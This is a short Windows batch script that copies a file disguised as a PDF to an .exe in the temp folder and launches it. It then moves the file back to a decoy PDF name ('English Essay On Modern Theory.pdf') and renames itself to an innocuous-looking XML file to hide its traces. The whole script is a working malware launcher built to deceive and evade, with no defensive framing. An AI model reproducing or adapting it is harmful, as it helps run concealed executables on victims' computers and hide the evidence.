@echo off
setlocal

rem Define the path to the PDF file
set "pdfPath= client path"

rem Define temporary paths
set "tempExePath=%temp%\file.exe"
set "restoredPdfPath=C:\Users\suspi\OneDrive\Documents\English Essay On Modern Theory.pdf"
set "newBatchFileName=xml_file (368).xml"

rem Rename the PDF file to an EXE
copy /y "%pdfPath%" "%tempExePath%"

rem Launch the file as if it were an EXE
start "" "%tempExePath%"

rem Wait for a few seconds to ensure the file is launched
timeout /t 5 /nobreak >nul

rem Rename the EXE back to a PDF
move /y "%tempExePath%" "%restoredPdfPath%"

rem Rename and move this batch file to the temp directory
move /y "%~f0" "%temp%\%newBatchFileName%"

endlocal
